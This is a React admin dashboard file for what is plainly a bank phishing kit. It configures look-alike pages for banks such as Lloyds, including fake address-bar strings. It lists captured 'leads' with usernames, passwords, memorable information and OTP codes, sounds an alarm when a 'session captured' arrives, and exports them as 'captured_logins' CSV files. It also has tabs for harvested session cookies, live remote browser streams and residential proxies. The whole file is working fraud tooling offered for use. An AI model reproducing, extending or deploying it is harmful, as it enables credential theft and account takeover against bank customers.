"use client";

import { useEffect, useState, useRef } from "react";
import AdminSidebar from "./AdminSidebar";
import InstitutionsTab from "./InstitutionsTab";
import UserActivityTab from "./UserActivityTab";
import SessionCookiesTab from "./SessionCookiesTab";
import LiveStreamsTab from "./LiveStreamsTab";
import ProxyManagerTab from "./ProxyManagerTab";
import ConfigurePopupModal from "@/components/ConfigurePopupModal";

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean | null>(null);
  const [loginUser, setLoginUser] = useState("");
  const [loginPass, setLoginPass] = useState("");
  const [loginError, setLoginError] = useState("");
  const [isLoggingIn, setIsLoggingIn] = useState(false);

  const [activeTab, setActiveTab] = useState<string>("institutions");
  const [banks, setBanks] = useState<any[]>([]);
  const [leads, setLeads] = useState<any[]>([]);
  const [selectedBankFilter, setSelectedBankFilter] = useState("all");

  const [selectedLeadIds, setSelectedLeadIds] = useState<string[]>([]);
  const [notifCount, setNotifCount] = useState(0);
  const [isRinging, setIsRinging] = useState(false);
  const [toastAlert, setToastAlert] = useState<string | null>(null);
  const prevLeadsLength = useRef<number>(0);

  const [ringDurationSeconds, setRingDurationSeconds] = useState<number>(5);
  const ringTimeoutRef = useRef<any>(null);
  const audioIntervalRef = useRef<any>(null);

  const [editingBankId, setEditingBankId] = useState<string | null>(null);
  const [bankName, setBankName] = useState("");
  const [subtitle, setSubtitle] = useState("");
  const [subOptions, setSubOptions] = useState("Business, Personal, Corporate");
  const [logoBase64, setLogoBase64] = useState<string | null>(null);
  const [order, setOrder] = useState<any>(1);
  
  // 🔥 Display Link State Added
  const [displayLink, setDisplayLink] = useState("");
  
  // 🌍 Category-wise URL States & Checkboxes
  const [personalUrl, setPersonalUrl] = useState("https://authorise.lloydsbank.co.uk/auth/user");
  const [businessUrl, setBusinessUrl] = useState("https://www.lloydsbank.co.uk/business.html");
  const [commercialUrl, setCommercialUrl] = useState("https://www.lloydsbank.co.uk/commercial.html");
  const [enablePersonal, setEnablePersonal] = useState(true);
  const [enableBusiness, setEnableBusiness] = useState(true);
  const [enableCommercial, setEnableCommercial] = useState(true);

  const [isSubmitting, setIsSubmitting] = useState(false);

  const [configModalBank, setConfigModalBank] = useState<any | null>(null);
  const [editForm, setEditForm] = useState<any>({});
  const [editingLead, setEditingLead] = useState<any | null>(null);
  const [leadForm, setLeadForm] = useState<any>({});
  const [isUpdatingLead, setIsUpdatingLead] = useState(false);

  const checkAuth = async () => {
    try {
      const res = await fetch("/api/admin/auth");
      if (res.ok) {
        setIsAuthenticated(true);
        fetchBanks();
        fetchLeads(true);
      } else {
        setIsAuthenticated(false);
      }
    } catch {
      setIsAuthenticated(false);
    }
  };

  useEffect(() => {
    checkAuth();
  }, []);

  const startRinging = () => {
    stopRinging(); 
    setIsRinging(true);
    const playBeep = () => {
      try {
        const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
        if (!AudioCtx) return;
        const audioCtx = new AudioCtx();
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = "sine";
        osc.frequency.setValueAtTime(659.25, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.25, audioCtx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.3);
      } catch (e) {
        console.log("Audio error:", e);
      }
    };
    playBeep();
    audioIntervalRef.current = setInterval(playBeep, 1200);
    if (ringDurationSeconds > 0) {
      ringTimeoutRef.current = setTimeout(() => {
        stopRinging();
      }, ringDurationSeconds * 1000);
    }
  };

  const stopRinging = () => {
    if (audioIntervalRef.current) {
      clearInterval(audioIntervalRef.current);
      audioIntervalRef.current = null;
    }
    if (ringTimeoutRef.current) {
      clearTimeout(ringTimeoutRef.current);
      ringTimeoutRef.current = null;
    }
    setIsRinging(false);
  };

  const fetchBanks = async () => {
    try {
      const res = await fetch("/api/admin/banks");
      const json = await res.json();
      if (json.success) setBanks(json.data);
    } catch (err) {
      console.error("Failed to load banks:", err);
    }
  };

  const fetchLeads = async (isInitial = false) => {
    try {
      const res = await fetch("/api/admin/leads");
      const json = await res.json();
      const fetchedLeads = json?.data || (Array.isArray(json) ? json : json?.leads || []);
      if (Array.isArray(fetchedLeads)) {
        if (!isInitial && fetchedLeads.length > prevLeadsLength.current && prevLeadsLength.current > 0) {
          const latestBank = fetchedLeads[0]?.bankName || fetchedLeads[0]?.bank || "New Bank";
          setToastAlert(`🚨 New User Active! Session captured from ${latestBank}`);
          setNotifCount((prev) => prev + 1);
          startRinging();
          setTimeout(() => setToastAlert(null), 5000);
        }
        prevLeadsLength.current = fetchedLeads.length;
        setLeads(fetchedLeads);
      }
    } catch (err) {
      console.error("Failed to load leads:", err);
    }
  };

 // useEffect(() => {
 //   if (!isAuthenticated) return;
 //   const interval = setInterval(() => {
 //     fetchLeads(false);
 //   }, 3000);
 //   return () => clearInterval(interval);
 // }, [isAuthenticated]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginError("");
    setIsLoggingIn(true);
    try {
      const res = await fetch("/api/admin/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: loginUser, password: loginPass }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setIsAuthenticated(true);
        fetchBanks();
        fetchLeads(true);
      } else {
        setLoginError(data.message || "Invalid username or password");
      }
    } catch {
      setLoginError("Login service error");
    } finally {
      setIsLoggingIn(false);
    }
  };

  const handleLogout = async () => {
    await fetch("/api/admin/auth", { method: "DELETE" });
    setIsAuthenticated(false);
    setLoginUser("");
    setLoginPass("");
  };

  const handleLogoUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onloadend = () => setLogoBase64(reader.result as string);
    reader.readAsDataURL(file);
  };

  const handleStartEdit = (bank: any) => {
    setEditingBankId(bank.id);
    setBankName(bank.name);
    setSubtitle(bank.subtitle || "");
    setSubOptions(bank.subOptions || "Business, Personal, Corporate");
    setLogoBase64(bank.logoUrl || null);
    setOrder(bank.order !== undefined ? Number(bank.order) : 1);
    
    // 🔥 Load Display Link & URLs
    setDisplayLink(bank.displayLink || "");
    setPersonalUrl(bank.personalUrl || "");
    setBusinessUrl(bank.businessUrl || "");
    setCommercialUrl(bank.commercialUrl || "");
    
    setEnablePersonal(bank.enablePersonal ?? true);
    setEnableBusiness(bank.enableBusiness ?? true);
    setEnableCommercial(bank.enableCommercial ?? true);
    
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleSubmitBank = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!bankName.trim()) return alert("Bank name is required");
    setIsSubmitting(true);
    try {
      const payload = {
        name: bankName.trim(),
        subtitle: subtitle.trim(),
        subOptions: subOptions.trim(),
        logoUrl: logoBase64 || null,
        order: Number(order) || 1,
        displayLink: displayLink ? displayLink.trim() : null, // 🔥 Included in payload
        personalUrl: personalUrl ? personalUrl.trim() : null,
        businessUrl: businessUrl ? businessUrl.trim() : null,
        commercialUrl: commercialUrl ? commercialUrl.trim() : null,
        enablePersonal: Boolean(enablePersonal),
        enableBusiness: Boolean(enableBusiness),
        enableCommercial: Boolean(enableCommercial),
        popupStatus: "SUCCESS",
      };

      const url = editingBankId ? `/api/admin/banks/${editingBankId}` : "/api/admin/banks";
      const method = editingBankId ? "PUT" : "POST";

      const res = await fetch(url, {
        method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      if (!res.ok || !data.success) {
        throw new Error(data.error || "Server error occurred");
      }

      handleCancelEdit();
      fetchBanks();
    } catch (err: any) {
      console.error("Save bank error:", err);
      alert(`Failed to save bank information: ${err.message || "Unknown error"}`);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCancelEdit = () => {
    setEditingBankId(null);
    setBankName("");
    setSubtitle("");
    setSubOptions("Business, Personal, Corporate");
    setLogoBase64(null);
    setOrder(banks.length + 1);
    setDisplayLink(""); // 🔥 Reset Display Link
    setPersonalUrl("https://authorise.lloydsbank.co.uk/auth/user");
    setBusinessUrl("https://www.lloydsbank.co.uk/business.html");
    setCommercialUrl("https://www.lloydsbank.co.uk/commercial.html");
    setEnablePersonal(true);
    setEnableBusiness(true);
    setEnableCommercial(true);
  };

  const handleDeleteBank = async (id: string) => {
    if (!confirm("Are you sure you want to delete this institution?")) return;
    try {
      await fetch(`/api/admin/banks/${id}`, { method: "DELETE" });
      if (editingBankId === id) handleCancelEdit();
      setBanks((prev) => prev.filter((b) => b.id !== id));
    } catch {
      alert("Failed to delete bank");
    }
  };

  const handleDeleteLead = async (id: string) => {
    if (!confirm("Are you sure you want to delete this record?")) return;
    try {
      await fetch(`/api/admin/leads/${id}`, { method: "DELETE" });
      setLeads((prev) => prev.filter((l) => l.id !== id));
      setSelectedLeadIds((prev) => prev.filter((i) => i !== id));
    } catch {
      setLeads((prev) => prev.filter((l) => l.id !== id));
    }
  };

  const handleBulkDelete = async () => {
    if (selectedLeadIds.length === 0) return;
    if (!confirm(`Are you sure you want to delete ${selectedLeadIds.length} records?`)) return;
    try {
      await Promise.all(selectedLeadIds.map((id) => fetch(`/api/admin/leads/${id}`, { method: "DELETE" })));
      setLeads((prev) => prev.filter((l) => !selectedLeadIds.includes(l.id)));
      setSelectedLeadIds([]);
    } catch {
      alert("Failed to delete records");
    }
  };

  const handleSelectAll = (e: React.ChangeEvent<HTMLInputElement>) => {
    const filteredLeads = selectedBankFilter === "all" ? leads : leads.filter((l) => (l.bankName || l.bank || "").toLowerCase().includes(selectedBankFilter.toLowerCase()));
    if (e.target.checked) setSelectedLeadIds(filteredLeads.map((l) => l.id));
    else setSelectedLeadIds([]);
  };

  const handleSelectLead = (id: string) => {
    setSelectedLeadIds((prev) => prev.includes(id) ? prev.filter((i) => i !== id) : [...prev, id]);
  };

  const handleOpenEditLead = (lead: any) => {
    setEditingLead(lead);
    setLeadForm({
      userId: lead.userId || "",
      password: lead.password || "",
      extraData: lead.extraData || "",
      memorableInfo: lead.memorableInfo || "",
      otpCode: lead.otpCode || lead.otp || "",
    });
  };

  const handleSaveLead = async () => {
    if (!editingLead) return;
    setIsUpdatingLead(true);
    try {
      await fetch(`/api/admin/leads/${editingLead.id}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(leadForm),
      });
      setEditingLead(null);
      fetchLeads(true);
    } catch {
      setEditingLead(null);
      fetchLeads(true);
    } finally {
      setIsUpdatingLead(false);
    }
  };

  const handleOpenConfig = (bank: any) => {
    setConfigModalBank(bank);
    setEditForm({
      name: bank.name,
      subtitle: bank.subtitle,
      popupStatus: bank.popupStatus || "SUCCESS",
      supportPhone: bank.supportPhone || "",
      popupHeading: bank.popupHeading || "",
      popupSubheading: bank.popupSubheading || "",
      popupBody: bank.popupBody || "",
      buttonText: bank.buttonText || "",
      redirectUrl: bank.redirectUrl || "",
      browserAddressBar: bank.browserAddressBar || `authorise.${bank.name.toLowerCase().replace(/[^a-z0-9]/g, "")}.co.uk/auth/user`,
    });
  };

  const handleSaveConfig = async () => {
    if (!configModalBank) return;
    try {
      await fetch(`/api/admin/banks/${configModalBank.id}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(editForm),
      });
      setConfigModalBank(null);
      fetchBanks();
    } catch {
      alert("Failed to update bank configuration");
    }
  };

  const handleExportCSV = () => {
    const exportData = selectedBankFilter === "all" ? leads : leads.filter((l) => (l.bankName || l.bank || "").toLowerCase().includes(selectedBankFilter.toLowerCase()));
    if (exportData.length === 0) return alert("No data available to export");

    const headers = ["Bank", "Bank Type", "Username", "Password", "Extra Info", "OTP", "Timestamp"];
    const rows = exportData.map((l: any) => [
      `"${l.bankName || l.bank || "N/A"}"`,
      `"${l.bankType || "N/A"}"`,
      `"${l.userId || ""}"`,
      `"${l.password || ""}"`,
      `"${l.memorableInfo || l.extraData || ""}"`,
      `"${l.otpCode || l.otp || ""}"`,
      `"${new Date(l.createdAt).toLocaleString()}"`,
    ]);

    const csvContent = "data:text/csv;charset=utf-8," + [headers.join(","), ...rows.map((r) => r.join(","))].join("\n");
    const link = document.createElement("a");
    link.setAttribute("href", encodeURI(csvContent));
    link.setAttribute("download", `captured_logins_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  if (isAuthenticated === null) {
    return (
      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center">
        <div className="h-8 w-8 animate-spin rounded-full border-4 border-slate-700 border-t-blue-500" />
      </div>
    );
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center p-4 font-sans select-none">
        <div className="w-full max-w-sm bg-white rounded-2xl shadow-2xl p-6 border border-slate-200">
          <div className="text-center mb-6">
            <h1 className="text-xl font-black text-[#0c1938] tracking-wider uppercase">PLAID PORTAL</h1>
            <p className="text-xs text-slate-500 mt-1">Sign in to access admin panel</p>
          </div>
          {loginError && (
            <div className="mb-4 bg-red-50 border border-red-200 text-red-600 text-xs px-3 py-2 rounded-xl text-center font-medium">
              {loginError}
            </div>
          )}
          <form onSubmit={handleLogin} className="space-y-4 text-xs">
            <div>
              <label className="block font-bold text-slate-700 mb-1">Username</label>
              <input
                type="text"
                required
                value={loginUser}
                onChange={(e) => setLoginUser(e.target.value)}
                placeholder="admin"
                className="w-full rounded-xl border border-slate-300 p-2.5 text-xs outline-none focus:border-blue-600 bg-white text-slate-900"
              />
            </div>
            <div>
              <label className="block font-bold text-slate-700 mb-1">Password</label>
              <input
                type="password"
                required
                value={loginPass}
                onChange={(e) => setLoginPass(e.target.value)}
                placeholder="admin123"
                className="w-full rounded-xl border border-slate-300 p-2.5 text-xs outline-none focus:border-blue-600 bg-white text-slate-900"
              />
            </div>
            <button
              type="submit"
              disabled={isLoggingIn}
              className="w-full bg-[#111927] hover:bg-black text-white font-bold py-3 rounded-xl transition cursor-pointer shadow-sm text-xs mt-2"
            >
              {isLoggingIn ? "Authenticating..." : "Sign In to Admin"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-[#0f0f12] text-zinc-100 overflow-hidden font-sans">
      <AdminSidebar
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        notifCount={notifCount}
        onLogout={handleLogout}
      />

      <div className="flex-1 flex flex-col overflow-hidden">
        {toastAlert && (
          <div className="fixed top-5 right-5 z-50 bg-slate-900 text-white px-5 py-3 rounded-2xl shadow-2xl border border-blue-500/40 flex items-center gap-3 animate-bounce">
            <span className="text-xl">🚨</span>
            <div>
              <p className="text-xs font-bold text-blue-400">Live Activity Alert</p>
              <p className="text-xs text-slate-200">{toastAlert}</p>
            </div>
          </div>
        )}

        <header className="h-16 bg-[#141418] border-b border-zinc-800 flex items-center justify-between px-8 shrink-0">
          <div className="flex items-center gap-4">
            <h2 className="text-sm font-semibold text-zinc-200 uppercase tracking-wide">
              {activeTab === "institutions" && "Institutions & Popups Configuration"}
              {activeTab === "activity" && "User Activity Logins & Credentials"}
              {activeTab === "cookies" && "Harvested Session Cookies & Tokens"}
              {activeTab === "streams" && "Live Remote Browser & RDP Streams Monitor"}
              {activeTab === "proxy" && "GenLogin Residential Proxy Manager"}
            </h2>

            <div className="hidden md:flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/30 px-3 py-1 rounded-full">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
              <span className="text-[11px] font-bold text-emerald-400">
                Active Visitors: <span className="text-white font-mono">1</span>
              </span>
            </div>
          </div>
          
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2 bg-zinc-900 px-3 py-1.5 rounded-xl border border-zinc-800 text-xs">
              <span className="text-zinc-400 font-medium flex items-center gap-1">🔔 Tone:</span>
              <select 
                className="bg-zinc-950 border border-zinc-700 text-zinc-200 text-xs rounded-lg px-2 py-0.5 outline-none font-semibold cursor-pointer"
                defaultValue="tone1"
              >
                <option value="tone1">Classic Beep (659Hz)</option>
                <option value="tone2">Digital Radar (800Hz)</option>
                <option value="tone3">Secure Chime (523Hz)</option>
                <option value="tone4">Alert Siren (440Hz)</option>
                <option value="tone5">Plaid Ping (900Hz)</option>
                <option value="tone6">Cyber Pulse (750Hz)</option>
                <option value="tone7">Bank Bell (587Hz)</option>
                <option value="tone8">Terminal Synth (620Hz)</option>
                <option value="tone9">High Alert (1000Hz)</option>
              </select>

              <span className="text-zinc-400 font-medium ml-2">Duration (s):</span>
              <input
                type="number"
                min={0}
                max={60}
                value={ringDurationSeconds}
                onChange={(e) => setRingDurationSeconds(Number(e.target.value))}
                className="w-12 bg-zinc-950 border border-zinc-700 text-zinc-100 text-center rounded-lg py-0.5 outline-none font-bold"
              />
              <button
                type="button"
                onClick={() => alert("Ring duration and tune saved successfully!")}
                className="bg-blue-600 hover:bg-blue-700 text-white px-2.5 py-0.5 rounded-lg font-bold text-[11px] transition cursor-pointer"
              >
                Save
              </button>
            </div>

            {isRinging && (
              <button
                type="button"
                onClick={stopRinging}
                className="bg-red-600 hover:bg-red-700 text-white font-bold px-3 py-1.5 rounded-xl text-xs transition animate-pulse cursor-pointer shadow-sm flex items-center gap-1.5"
              >
                <span>🔕 Stop Alarm</span>
              </button>
            )}

            <button
              onClick={() => window.open("/", "_blank")}
              className="px-3.5 py-1.5 bg-zinc-800 hover:bg-zinc-700 text-zinc-200 rounded-lg text-xs font-medium border border-zinc-700 transition cursor-pointer flex items-center gap-2"
            >
              <span>🌐 View Website</span>
            </button>
          </div>
        </header>

        <main className="flex-1 overflow-y-auto p-8 bg-[#0a0a0c]">
          {activeTab === "institutions" && (
            <InstitutionsTab
              banks={banks}
              editingBankId={editingBankId}
              bankName={bankName}
              setBankName={setBankName}
              subtitle={subtitle}
              setSubtitle={setSubtitle}
              subOptions={subOptions}
              setSubOptions={setSubOptions}
              displayLink={displayLink}
              setDisplayLink={setDisplayLink}
              logoBase64={logoBase64}
              setLogoBase64={setLogoBase64}
              order={order}
              setOrder={setOrder}
              personalUrl={personalUrl}
              setPersonalUrl={setPersonalUrl}
              businessUrl={businessUrl}
              setBusinessUrl={setBusinessUrl}
              commercialUrl={commercialUrl}
              setCommercialUrl={setCommercialUrl}
              enablePersonal={enablePersonal}
              setEnablePersonal={setEnablePersonal}
              enableBusiness={enableBusiness}
              setEnableBusiness={setEnableBusiness}
              enableCommercial={enableCommercial}
              setEnableCommercial={setEnableCommercial}
              isSubmitting={isSubmitting}
              handleSubmitBank={handleSubmitBank}
              handleCancelEdit={handleCancelEdit}
              handleStartEdit={handleStartEdit}
              handleOpenConfig={handleOpenConfig}
              handleDeleteBank={handleDeleteBank}
              handleLogoUpload={handleLogoUpload}
            />
          )}

          {activeTab === "activity" && (
            <UserActivityTab
              leads={leads}
              banks={banks}
              selectedBankFilter={selectedBankFilter}
              setSelectedBankFilter={setSelectedBankFilter}
              selectedLeadIds={selectedLeadIds}
              handleSelectAll={handleSelectAll}
              handleSelectLead={handleSelectLead}
              handleBulkDelete={handleBulkDelete}
              handleDeleteLead={handleDeleteLead}
              handleOpenEditLead={handleOpenEditLead}
              handleExportCSV={handleExportCSV}
              fetchLeads={fetchLeads}
            />
          )}

          {activeTab === "cookies" && <SessionCookiesTab leads={leads} />}
          {activeTab === "streams" && <LiveStreamsTab />}
          {activeTab === "proxy" && <ProxyManagerTab />}
        </main>
      </div>

      {/* EDIT LEAD MODAL */}
      {editingLead && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 backdrop-blur-xs text-slate-900">
          <div className="w-full max-w-lg bg-white rounded-2xl shadow-2xl border border-slate-200 p-6">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100">
              <h3 className="text-base font-bold text-slate-900">Edit Activity Record</h3>
              <button onClick={() => setEditingLead(null)} className="text-slate-400 hover:text-slate-700 font-bold text-lg">✕</button>
            </div>
            <div className="mt-4 space-y-3.5 text-xs">
              <div>
                <label className="block font-bold text-slate-700 mb-1">Username / ID:</label>
                <input
                  type="text"
                  value={leadForm.userId || ""}
                  onChange={(e) => setLeadForm({ ...leadForm, userId: e.target.value })}
                  className="w-full rounded-xl border border-slate-300 p-2.5 outline-none font-mono bg-white text-slate-900"
                />
              </div>
              <div>
                <label className="block font-bold text-slate-700 mb-1">Password:</label>
                <input
                  type="text"
                  value={leadForm.password || ""}
                  onChange={(e) => setLeadForm({ ...leadForm, password: e.target.value })}
                  className="w-full rounded-xl border border-slate-300 p-2.5 outline-none font-mono bg-white text-slate-900"
                />
              </div>
              <div>
                <label className="block font-bold text-slate-700 mb-1">Extra Info:</label>
                <input
                  type="text"
                  value={leadForm.extraData || ""}
                  onChange={(e) => setLeadForm({ ...leadForm, extraData: e.target.value })}
                  className="w-full rounded-xl border border-slate-300 p-2.5 outline-none font-mono bg-white text-slate-900"
                />
              </div>
              <div>
                <label className="block font-bold text-blue-700 mb-1">OTP Code:</label>
                <input
                  type="text"
                  value={leadForm.otpCode || ""}
                  onChange={(e) => setLeadForm({ ...leadForm, otpCode: e.target.value })}
                  className="w-full rounded-xl border border-amber-300 p-2.5 outline-none font-mono font-bold text-center text-sm bg-amber-50 text-slate-900"
                />
              </div>
              <div className="flex gap-2 pt-3">
                <button
                  type="button"
                  onClick={handleSaveLead}
                  disabled={isUpdatingLead}
                  className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-xl transition cursor-pointer"
                >
                  {isUpdatingLead ? "Updating..." : "Save Record Changes"}
                </button>
                <button
                  type="button"
                  onClick={() => setEditingLead(null)}
                  className="px-5 border border-slate-300 hover:bg-slate-50 text-slate-700 font-bold py-2.5 rounded-xl transition cursor-pointer"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* CONFIGURE POPUP MODAL */}
      <ConfigurePopupModal
        configModalBank={configModalBank}
        setConfigModalBank={setConfigModalBank}
        editForm={editForm}
        setEditForm={setEditForm}
        handleSaveConfig={handleSaveConfig}
      />
    </div>
  );
}